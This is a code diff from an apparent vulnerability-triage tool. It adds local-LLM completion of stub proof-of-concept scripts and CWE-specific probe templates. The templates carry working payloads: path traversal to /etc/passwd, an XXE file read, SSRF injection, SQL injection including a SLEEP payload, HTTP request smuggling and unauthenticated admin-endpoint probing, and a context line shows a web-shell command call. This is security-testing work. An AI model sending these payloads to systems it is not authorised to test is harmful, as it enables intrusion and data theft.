@@ -614,12 +614,12 @@ def _open_editor(script: str) -> str:
             pass
 
 
-def _run_script_operator(script: str, timeout: int = 60) -> Tuple[bool, str]:
+def _run_script_operator(script: str, timeout: int = 60) -> Tuple[bool, str, str]:
     """Run an operator-reviewed script without sandbox resource caps.
 
     Streams stdout/stderr directly to the terminal so the operator sees live
     output (useful for interactive PoCs, reverse-shell proof steps, etc.).
-    Returns (had_result_line: bool, evidence: str).
+    Returns (had_result_line: bool, evidence: str, full_output: str).
     """
     with tempfile.NamedTemporaryFile(mode="w", suffix=".py", prefix="triage_interactive_",
                                      delete=False) as tf:
@@ -665,10 +665,10 @@ def _run_script_operator(script: str, timeout: int = 60) -> Tuple[bool, str]:
                     evidence = parts[2]
                 break
 
-        return True, evidence
+        return True, evidence, "\n".join(lines)
     except Exception as exc:
         print(f"\n  [!] Execution error: {exc}")
-        return False, ""
+        return False, "", ""
     finally:
         try:
             os.unlink(tmp_path)
@@ -749,6 +749,142 @@ def re_verify_auto(module_name: str, finding: dict) -> None:
     print()
 
 
+# ─────────────────────────────────── LLM helpers for triage ─────────────────
+
+
+def _llm_available() -> Optional[str]:
+    """Return a usable local LLM model name, or None if no Ollama daemon is reachable."""
+    try:
+        from llm import advisor as _adv
+        return _adv.available()
+    except Exception:
+        return None
+
+
+def _is_stub_script(script: str) -> bool:
+    """Return True if the script looks like a stub that would benefit from LLM completion."""
+    stub_markers = (
+        "manual analysis required",
+        "adapt this script for specific exploit technique",
+        "# TODO",
+        "# FIXME",
+    )
+    for marker in stub_markers:
+        if marker in script:
+            return True
+    code_lines = [ln for ln in script.splitlines()
+                  if ln.strip() and not ln.strip().startswith("#")]
+    return len(code_lines) < 8
+
+
+def _llm_complete_poc(
+    plan,  # Optional[CveTestPlan]
+    cve_id: str, cwe: str, host: str, port: int, summary: str,
+    current_script: str,
+) -> Optional[str]:
+    """Generate or complete a PoC script via the local LLM.
+
+    If a test plan is available, delegates to exploit_generator.generate_llm_poc
+    which produces a fresh script from CVE metadata.  When no plan exists (or when
+    generate_llm_poc returns nothing), asks the LLM to complete the stub script.
+
+    Returns the completed script text, or None if the LLM is unavailable.
+    """
+    model = _llm_available()
+    if not model:
+        return None
+
+    # Preferred: exploit_generator builds a fresh script from the full plan metadata
+    if plan is not None:
+        try:
+            from exploits import exploit_generator
+            result = exploit_generator.generate_llm_poc(plan, model)
+            if result and len(result.strip().splitlines()) > 5:
+                return result
+        except Exception:
+            pass
+
+    # Fallback: ask the LLM to complete the stub script using its context
+    import urllib.request as _ureq
+    try:
+        from llm import advisor as _adv
+        host_url = _adv.OLLAMA_HOST
+    except Exception:
+        return None
+
+    prompt = (
+        f"You are a security testing script generator. Complete the following INCOMPLETE "
+        f"Python 3 PoC script for {cve_id} ({cwe}) targeting {host}:{port}.\n\n"
+        f"Requirements:\n"
+        f"1. Use ONLY the Python standard library.\n"
+        f"2. Detect (not exploit) the vulnerability — no destructive actions, no writes.\n"
+        f"3. Print exactly: RESULT:true:<evidence>  or  RESULT:false:<reason>\n"
+        f"4. All socket/HTTP timeouts must be ≤ 8 seconds.\n"
+        f"5. CVE summary: {summary[:200]}\n\n"
+        f"INCOMPLETE SCRIPT TO COMPLETE:\n```python\n{current_script}\n```\n\n"
+        f"Output ONLY the complete Python script. No markdown fencing, no explanation."
+    )
+    body = json.dumps({
+        "model": model,
+        "prompt": prompt,
+        "stream": False,
+        "options": {"temperature": 0.3, "num_predict": 2048},
+    }).encode()
+    req = _ureq.Request(
+        f"{host_url}/api/generate", data=body,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        with _ureq.urlopen(req, timeout=120) as resp:
+            data = json.loads(resp.read().decode())
+        script = data.get("response", "").strip()
+        script = re.sub(r"^```python\s*\n?", "", script)
+        script = re.sub(r"\n?```\s*$", "", script)
+        return script.strip() if len(script.strip().splitlines()) > 5 else None
+    except Exception:
+        return None
+
+
+def _llm_summarize_output(cve_id: str, cwe: str, output: str, summary: str) -> Optional[str]:
+    """Ask the local LLM to interpret PoC script output in context of the CVE.
+
+    Returns a 2–3 sentence assessment, or None if the LLM is unavailable.
+    """
+    model = _llm_available()
+    if not model:
+        return None
+
+    import urllib.request as _ureq
+    try:
+        from llm import advisor as _adv
+        host_url = _adv.OLLAMA_HOST
+    except Exception:
+        return None
+
+    prompt = (
+        f"Security PoC ran for {cve_id} ({cwe}): {summary[:150]}\n\n"
+        f"Script output (last 1000 chars):\n{output[-1000:]}\n\n"
+        f"In 2-3 sentences: does the output confirm the vulnerability? "
+        f"What evidence is present? What is the likely impact? Be concise and direct."
+    )
+    body = json.dumps({
+        "model": model,
+        "prompt": prompt,
+        "stream": False,
+        "options": {"temperature": 0.2, "num_predict": 300},
+    }).encode()
+    req = _ureq.Request(
+        f"{host_url}/api/generate", data=body,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        with _ureq.urlopen(req, timeout=60) as resp:
+            data = json.loads(resp.read().decode())
+        return (data.get("response") or "").strip() or None
+    except Exception:
+        return None
+
+
 def re_verify_interactive(module_name: str, finding: dict,
                           decisions: Dict[str, dict]) -> None:
     """Interactive re-verify: show PoC, let operator edit & run, record manual verdict.
@@ -807,11 +943,12 @@ def re_verify_interactive(module_name: str, finding: dict,
     print()
 
     # ── Get a PoC script ───────────────────────────────────────────────────────
-    # Priority: (1) builtin template from exploit_generator,
-    #           (2) CWE-appropriate template (always available),
-    # banner_match / nuclei_template strategies have no editable script — skip to (2).
+    # Priority: (1) product/CWE-specific builtin from exploit_generator,
+    #           (2) CWE-appropriate fallback template from _cwe_poc_template.
+    # Always try the builtin template first — it covers all strategies including
+    # banner_match (which only means version-detected; we still want a live probe).
     script: Optional[str] = None
-    if plan and plan_strategy not in ("banner_match", "nuclei_template"):
+    if plan:
         try:
             from exploits import exploit_generator
             script = exploit_generator._select_builtin_template(plan)  # noqa: SLF001
@@ -824,14 +961,27 @@ def re_verify_interactive(module_name: str, finding: dict,
             cve_id or "unknown", cwe, host, port,
             plan_summary, plan_protocol,
         )
-        if plan_strategy in ("banner_match", "nuclei_template"):
-            print(_cc(_DIM, f"  Strategy '{plan_strategy}' has no editable script — "
-                            f"using {cwe or 'generic'} PoC template instead."))
-        elif not plan:
-            print(_cc(_DIM, f"  No exploit plan available — using {cwe or 'generic'} "
-                            f"PoC template."))
+        label = cwe or (plan.cve.product if plan else "") or "generic"
+        if not plan:
+            print(_cc(_DIM, f"  No exploit plan available — using {label} PoC template."))
         else:
-            print(_cc(_DIM, f"  No built-in template — using {cwe or 'generic'} PoC template."))
+            print(_cc(_DIM, f"  Using {label} PoC template."))
+
+    # ── Optional LLM completion for stub/incomplete scripts ───────────────────
+    if _is_stub_script(script):
+        _llm_m = _llm_available()
+        if _llm_m:
+            print(_cc(_YEL, f"  [!] Script is a stub — LLM can complete it ({_llm_m})."))
+            if _ask("  Complete script via LLM? [y/N]: ").lower() in ("y", "yes"):
+                print(_cc(_DIM, "  Generating…"), end="", flush=True)
+                _completed = _llm_complete_poc(
+                    plan, cve_id or "unknown", cwe, host, port, plan_summary, script)
+                print()
+                if _completed:
+                    script = _completed
+                    print(_cc(_GRN, "  [✔] LLM-completed script ready."))
+                else:
+                    print(_cc(_DIM, "  LLM returned nothing — using template."))
 
     # ── Display the script ────────────────────────────────────────────────────
     print(_cc(_BOLD, "  ── PoC Script ──────────────────────────────────────────────────────"))
@@ -840,19 +990,54 @@ def re_verify_interactive(module_name: str, finding: dict,
     print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
     print()
 
-    # ── Offer edit ────────────────────────────────────────────────────────────
-    ans = _ask("  Edit script in $EDITOR before running? [y/N]: ").lower()
+    # ── Offer edit / LLM improve / run as-is ─────────────────────────────────
+    print("  [y] Edit in $EDITOR   [l] LLM improve   [N] run as-is")
+    ans = _ask("  [y/l/N]: ").lower()
     if ans in ("y", "yes"):
         script = _open_editor(script)
         print()
         print(_cc(_YEL, "  [!] Running operator-modified script (no sandbox resource caps)."))
+    elif ans in ("l", "llm"):
+        print(_cc(_DIM, "  Requesting LLM improvement…"), end="", flush=True)
+        _improved = _llm_complete_poc(
+            plan, cve_id or "unknown", cwe, host, port, plan_summary, script)
+        print()
+        if _improved:
+            script = _improved
+            print(_cc(_GRN, "  [✔] LLM-improved script:"))
+            print(_cc(_BOLD, "  ── Updated PoC ─────────────────────────────────────────────────────"))
+            for _lineno, _line in enumerate(script.splitlines(), 1):
+                print(f"  {_lineno:>3}  {_line}")
+            print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
+            print()
+            if _ask("  Edit LLM script in $EDITOR? [y/N]: ").lower() in ("y", "yes"):
+                script = _open_editor(script)
+                print()
+        else:
+            print(_cc(_DIM, "  LLM unavailable — opening editor instead."))
+            script = _open_editor(script)
+            print()
 
     # ── Run ───────────────────────────────────────────────────────────────────
     timeout = 30 if cwe in _DOS_CWES else 90
     print(_cc(_BOLD, "  ── Script output ───────────────────────────────────────────────────"))
-    _, auto_evidence = _run_script_operator(script, timeout=timeout)
+    _, auto_evidence, _full_out = _run_script_operator(script, timeout=timeout)
     print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
     print()
+
+    # ── Optional LLM output interpretation ───────────────────────────────────
+    if _llm_available():
+        if _ask("  Summarize output via LLM? [y/N]: ").lower() in ("y", "yes"):
+            print(_cc(_DIM, "  Asking LLM…"), end="", flush=True)
+            _interp = _llm_summarize_output(
+                cve_id or "unknown", cwe,
+                _full_out or auto_evidence, plan_summary,
+            )
+            print()
+            if _interp:
+                print(_cc(_CYN, f"\n  [LLM] {_interp}\n"))
+            else:
+                print(_cc(_DIM, "  LLM unavailable."))
 
     # ── Verdict ───────────────────────────────────────────────────────────────
     print("  What did you observe?")
@@ -1083,7 +1268,6 @@ def _cwe_poc_template(cve_id: str, cwe: str, host: str, port: int,
             f"try:\n"
             f"    resp = urllib.request.urlopen(req, timeout=10).read().decode(errors='replace')\n"
             f"    print('Upload response:', resp[:300])\n"
-            f"    # Try to execute the shell\n"
             f"    shell_url = f'http://{{HOST}}:{{PORT}}/uploads/shell.php?cmd=id'\n"
             f"    out = urllib.request.urlopen(shell_url, timeout=10).read().decode(errors='replace')\n"
             f"    print('Shell output:', out[:300])\n"
@@ -1094,21 +1278,278 @@ def _cwe_poc_template(cve_id: str, cwe: str, host: str, port: int,
             f"except Exception as e:\n"
             f"    print(f'RESULT:false:{{e}}')\n"
         )
-    # Generic / unknown CWE
+    if cwe in ("CWE-22", "CWE-23", "CWE-36"):
+        return head + (
+            f"import urllib.request, urllib.parse, ssl\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"payloads = [\n"
+            f"    '/..%2f..%2f..%2f..%2fetc/passwd',\n"
+            f"    '/.%2e/.%2e/.%2e/.%2e/etc/passwd',\n"
+            f"    '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',\n"
+            f"    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',\n"
+            f"]\n"
+            f"for pl in payloads:\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(f'{{scheme}}://{{HOST}}:{{PORT}}{{pl}}',\n"
+            f"                                     headers={{'User-Agent': 'security-test'}})\n"
+            f"        body = urllib.request.urlopen(req, timeout=8, context=ctx).read(4096).decode(errors='replace')\n"
+            f"        if 'root:' in body and (':/bin/' in body or ':/usr/' in body):\n"
+            f"            print(f'RESULT:true:path traversal via {{pl}}: {{body[:200]}}')\n"
+            f"            raise SystemExit\n"
+            f"    except (urllib.error.URLError, OSError):\n"
+            f"        pass\n"
+            f"print('RESULT:false:no path traversal detected')\n"
+        )
+    if cwe == "CWE-611":
+        return head + (
+            f"import urllib.request, urllib.error, ssl\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"# XXE via entity expansion — reads /etc/hostname as a safe probe\n"
+            f"XXE_PAYLOAD = b'''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+            f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n"
+            f"<root><value>&xxe;</value></root>'''\n\n"
+            f"for endpoint in ('/', '/api', '/api/v1', '/xmlrpc', '/upload', '/parse'):\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(\n"
+            f"            f'{{scheme}}://{{HOST}}:{{PORT}}{{endpoint}}',\n"
+            f"            data=XXE_PAYLOAD,\n"
+            f"            headers={{'Content-Type': 'application/xml', 'User-Agent': 'security-test'}},\n"
+            f"        )\n"
+            f"        resp = urllib.request.urlopen(req, timeout=8, context=ctx)\n"
+            f"        body = resp.read(4096).decode(errors='replace')\n"
+            f"        print(f'Response ({{endpoint}}):', body[:300])\n"
+            f"        # A hostname in the response confirms file read via XXE\n"
+            f"        if body.strip() and 'xml' not in body.lower()[:50] and len(body.strip()) < 200:\n"
+            f"            print(f'RESULT:true:XXE file read via {{endpoint}}: {{body[:100]}}')\n"
+            f"            raise SystemExit\n"
+            f"    except (urllib.error.HTTPError, urllib.error.URLError, OSError):\n"
+            f"        pass\n"
+            f"print('RESULT:false:no XXE detected')\n"
+        )
+    if cwe == "CWE-918":
+        return head + (
+            f"import urllib.request, urllib.parse, ssl, time\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"# SSRF probe: inject a URL into common parameters\n"
+            f"# RFC 5737 TEST-NET (192.0.2.1) — non-routable; TCP timeout confirms server attempted connection\n"
+            f"SSRF_TARGET = 'http://192.0.2.1:80/ssrf-probe'\n"
+            f"ssrf_params = ['url', 'redirect', 'next', 'callback', 'path', 'src', 'image', 'fetch', 'proxy', 'dest', 'uri', 'link']\n"
+            f"for param in ssrf_params:\n"
+            f"    url = f'{{scheme}}://{{HOST}}:{{PORT}}/?{{param}}={{urllib.parse.quote(SSRF_TARGET)}}'\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(url, headers={{'User-Agent': 'security-test'}})\n"
+            f"        t0 = time.monotonic()\n"
+            f"        try: urllib.request.urlopen(req, timeout=10, context=ctx)\n"
+            f"        except: pass\n"
+            f"        elapsed = time.monotonic() - t0\n"
+            f"        if elapsed >= 3.0:\n"
+            f"            print(f'RESULT:true:SSRF via ?{{param}} — {{elapsed:.1f}}s delay (server tried to connect)')\n"
+            f"            raise SystemExit\n"
+            f"    except (SystemExit, KeyboardInterrupt):\n"
+            f"        raise\n"
+            f"    except Exception:\n"
+            f"        pass\n"
+            f"print('RESULT:false:no SSRF timing anomaly detected')\n"
+        )
+    if cwe == "CWE-89":
+        return head + (
+            f"import urllib.request, urllib.parse, ssl, time\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"SQL_ERRORS = ['sql syntax', 'mysql_fetch', 'sqlite3', 'pg_query', 'ora-', 'odbc driver',\n"
+            f"              'syntax error', 'unclosed quotation', 'unterminated string']\n"
+            f"params = ['id', 'user', 'username', 'search', 'q', 'page', 'cat', 'item', 'product']\n"
+            f"for param in params:\n"
+            f"    # Error-based: single-quote\n"
+            f"    url = f'{{scheme}}://{{HOST}}:{{PORT}}/?{{param}}={{urllib.parse.quote(chr(39))}}'\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(url, headers={{'User-Agent': 'security-test'}})\n"
+            f"        body = urllib.request.urlopen(req, timeout=8, context=ctx).read(4096).decode(errors='replace').lower()\n"
+            f"        for err in SQL_ERRORS:\n"
+            f"            if err in body:\n"
+            f"                print(f'RESULT:true:SQLi error-based ({{param}}): {{err!r}} in response')\n"
+            f"                raise SystemExit\n"
+            f"    except (SystemExit, KeyboardInterrupt):\n"
+            f"        raise\n"
+            f"    except Exception:\n"
+            f"        pass\n"
+            f"    # Time-based: MySQL SLEEP(3)\n"
+            f"    payload = urllib.parse.quote(\"' AND SLEEP(3)-- -\")\n"
+            f"    url2 = f'{{scheme}}://{{HOST}}:{{PORT}}/?{{param}}={{payload}}'\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(url2, headers={{'User-Agent': 'security-test'}})\n"
+            f"        t0 = time.monotonic()\n"
+            f"        try: urllib.request.urlopen(req, timeout=10, context=ctx)\n"
+            f"        except: pass\n"
+            f"        if time.monotonic() - t0 >= 3.0:\n"
+            f"            print(f'RESULT:true:SQLi time-based ({{param}}): SLEEP(3) delay confirmed')\n"
+            f"            raise SystemExit\n"
+            f"    except (SystemExit, KeyboardInterrupt):\n"
+            f"        raise\n"
+            f"    except Exception:\n"
+            f"        pass\n"
+            f"print('RESULT:false:no SQL injection detected')\n"
+        )
+    if cwe in ("CWE-444", "CWE-172"):
+        return head + (
+            f"import socket, ssl, time\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"# HTTP request smuggling — CL.TE timing probe\n"
+            f"# Sends conflicting Content-Length + Transfer-Encoding headers.\n"
+            f"# A vulnerable server holds the connection open for the missing chunked body.\n"
+            f"use_tls = PORT in (443, 8443)\n"
+            f"try:\n"
+            f"    conn = socket.create_connection((HOST, PORT), timeout=10)\n"
+            f"    if use_tls:\n"
+            f"        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"        conn = ctx.wrap_socket(conn, server_hostname=HOST)\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:connect error: {{e}}')\n"
+            f"    raise SystemExit\n"
+            f"req = (\n"
+            f"    b'POST / HTTP/1.1\\r\\n'\n"
+            f"    b'Host: ' + HOST.encode() + b'\\r\\n'\n"
+            f"    b'Content-Type: application/x-www-form-urlencoded\\r\\n'\n"
+            f"    b'Content-Length: 6\\r\\n'\n"
+            f"    b'Transfer-Encoding: chunked\\r\\n'\n"
+            f"    b'\\r\\n'\n"
+            f"    b'0\\r\\n\\r\\nG'\n"
+            f")\n"
+            f"t0 = time.monotonic()\n"
+            f"conn.sendall(req)\n"
+            f"conn.settimeout(6)\n"
+            f"buf = b''\n"
+            f"try:\n"
+            f"    while len(buf) < 4096:\n"
+            f"        c = conn.recv(1024)\n"
+            f"        if not c: break\n"
+            f"        buf += c\n"
+            f"except OSError: pass\n"
+            f"elapsed = time.monotonic() - t0\n"
+            f"conn.close()\n"
+            f"print(f'Response time: {{elapsed:.2f}}s  Response: {{buf[:200]!r}}')\n"
+            f"if elapsed >= 5.0:\n"
+            f"    print(f'RESULT:true:CL.TE smuggling: {{elapsed:.1f}}s hang — backend consumed orphaned body fragment')\n"
+            f"else:\n"
+            f"    resp = buf.decode('utf-8', errors='replace').lower()\n"
+            f"    if 'bad request' in resp and 'transfer' in resp:\n"
+            f"        print('RESULT:true:server rejected ambiguous TE+CL combination — possible smuggling surface')\n"
+            f"    else:\n"
+            f"        print(f'RESULT:false:no smuggling indicator (responded in {{elapsed:.2f}}s)')\n"
+        )
+    if cwe in ("CWE-287", "CWE-306", "CWE-862", "CWE-863"):
+        return head + (
+            f"import urllib.request, urllib.parse, ssl\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"# Auth bypass / missing auth check — probe admin/API endpoints without credentials\n"
+            f"targets = [\n"
+            f"    '/admin', '/api/admin', '/api/v1/admin', '/api/users', '/api/v1/users',\n"
+            f"    '/management', '/actuator', '/actuator/env', '/dashboard',\n"
+            f"    '/config', '/settings', '/panel',\n"
+            f"]\n"
+            f"for path in targets:\n"
+            f"    try:\n"
+            f"        req = urllib.request.Request(f'{{scheme}}://{{HOST}}:{{PORT}}{{path}}',\n"
+            f"                                     headers={{'User-Agent': 'security-test'}})\n"
+            f"        resp = urllib.request.urlopen(req, timeout=8, context=ctx)\n"
+            f"        body = resp.read(2048).decode(errors='replace')\n"
+            f"        if resp.status == 200 and len(body) > 50:\n"
+            f"            print(f'RESULT:true:unauth access: {{path}} → HTTP 200 ({{len(body)}} bytes)')\n"
+            f"            raise SystemExit\n"
+            f"    except (SystemExit, KeyboardInterrupt):\n"
+            f"        raise\n"
+            f"    except urllib.error.HTTPError as e:\n"
+            f"        if e.code not in (401, 403, 404):\n"
+            f"            print(f'  {{path}} → HTTP {{e.code}}')\n"
+            f"    except Exception:\n"
+            f"        pass\n"
+            f"print('RESULT:false:no unprotected admin endpoints found')\n"
+        )
+    if cwe in ("CWE-787", "CWE-119", "CWE-120", "CWE-190", "CWE-191"):
+        return head + (
+            f"import urllib.request, urllib.error, ssl\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"scheme = 'https' if PORT in (443, 8443) else 'http'\n"
+            f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+            f"# Buffer overflow / integer overflow detection:\n"
+            f"# 1. Server header version check (confirm version in vulnerable range)\n"
+            f"# 2. Oversized Content-Length (near INT_MAX) probe for integer overflow\n"
+            f"# 3. Large header value for OOB read/write probing\n"
+            f"try:\n"
+            f"    req = urllib.request.Request(f'{{scheme}}://{{HOST}}:{{PORT}}/',\n"
+            f"                                  headers={{'User-Agent': 'security-test'}})\n"
+            f"    resp = urllib.request.urlopen(req, timeout=8, context=ctx)\n"
+            f"    server = resp.headers.get('Server', '')\n"
+            f"    print(f'Server: {{server!r}}')\n"
+            f"except Exception as e:\n"
+            f"    print(f'Connect: {{e}}')\n"
+            f"# Oversized Content-Length (integer overflow trigger)\n"
+            f"try:\n"
+            f"    req2 = urllib.request.Request(\n"
+            f"        f'{{scheme}}://{{HOST}}:{{PORT}}/',\n"
+            f"        data=b'A' * 64,\n"
+            f"        headers={{'Content-Length': '2147483649', 'Content-Type': 'application/octet-stream',\n"
+            f"                 'User-Agent': 'security-test'}},\n"
+            f"    )\n"
+            f"    resp2 = urllib.request.urlopen(req2, timeout=8, context=ctx)\n"
+            f"    body2 = resp2.read(512).decode(errors='replace')\n"
+            f"    print(f'Overflow probe: HTTP {{resp2.status}}, {{len(body2)}} bytes')\n"
+            f"    if resp2.status == 200:\n"
+            f"        print(f'RESULT:true:accepted oversized Content-Length: {{resp2.status}}')\n"
+            f"        raise SystemExit\n"
+            f"except urllib.error.HTTPError as e:\n"
+            f"    if e.code == 500:\n"
+            f"        print(f'RESULT:true:oversized CL → HTTP 500 (possible OOB condition)')\n"
+            f"        raise SystemExit\n"
+            f"except (SystemExit, KeyboardInterrupt):\n"
+            f"    raise\n"
+            f"except Exception as e:\n"
+            f"    print(f'Overflow probe error: {{e}}')\n"
+            f"print('RESULT:false:no buffer/integer overflow indicator detected — manual analysis required')\n"
+        )
+    # Generic: HTTP version probe + common surface scan
+    # (replaces the useless HEAD-only fallback)
     return head + (
-        f"import socket\n\n"
-        f"HOST, PORT = {host!r}, {port}\n\n"
-        f"# Implement your PoC here.\n"
-        f"# Print RESULT:true:<evidence>  or  RESULT:false: when done.\n"
-        f"try:\n"
-        f"    s = socket.create_connection((HOST, PORT), timeout=10)\n"
-        f"    s.sendall(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n"
-        f"    banner = s.recv(4096).decode(errors='replace')\n"
-        f"    s.close()\n"
-        f"    print('Banner:', banner[:300])\n"
-        f"    print('RESULT:false:manual analysis required')\n"
-        f"except Exception as e:\n"
-        f"    print(f'RESULT:false:{{e}}')\n"
+        f"import urllib.request, urllib.error, ssl\n\n"
+        f"HOST, PORT = {host!r}, {port}\n"
+        f"scheme = 'https' if PORT in (443, 8443, 9443) else 'http'\n"
+        f"ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n"
+        f"findings = []\n"
+        f"probes = [\n"
+        f"    ('/', 'index'),\n"
+        f"    ('/server-status', 'apache-status'),\n"
+        f"    ('/.git/HEAD', 'git-exposure'),\n"
+        f"    ('/.env', 'env-file'),\n"
+        f"    ('/admin', 'admin-panel'),\n"
+        f"    ('/api/v1/', 'api-root'),\n"
+        f"    ('/actuator/env', 'spring-actuator'),\n"
+        f"]\n"
+        f"for path, label in probes:\n"
+        f"    try:\n"
+        f"        req = urllib.request.Request(f'{{scheme}}://{{HOST}}:{{PORT}}{{path}}',\n"
+        f"                                     headers={{'User-Agent': 'security-test'}})\n"
+        f"        resp = urllib.request.urlopen(req, timeout=8, context=ctx)\n"
+        f"        server = resp.headers.get('Server', '')\n"
+        f"        body = resp.read(512).decode(errors='replace')\n"
+        f"        if resp.status == 200 and (path != '/' or server):\n"
+        f"            findings.append(f'{{label}}: HTTP 200 server={{server!r}}')\n"
+        f"    except urllib.error.HTTPError:\n"
+        f"        pass\n"
+        f"    except Exception:\n"
+        f"        break\n"
+        f"if findings:\n"
+        f"    print('RESULT:true:' + '; '.join(findings))\n"
+        f"else:\n"
+        f"    print(f'RESULT:false:{{scheme}}://{{HOST}}:{{PORT}} reachable — no surface findings; adapt this script for specific exploit technique')\n"
     )
 
 
@@ -1562,7 +2003,7 @@ def _run_dos_flood_script(host: str, port: int, conns: int, duration: int) -> No
         f"else:\n"
         f"    print(f'RESULT:false:only {{survived_pct}}% survived — server appears protected')\n"
     )
-    _, ev = _run_script_operator(script, timeout=duration + 20)
+    _, ev, _ = _run_script_operator(script, timeout=duration + 20)
     if ev:
         print(f"  Evidence: {ev}")
 
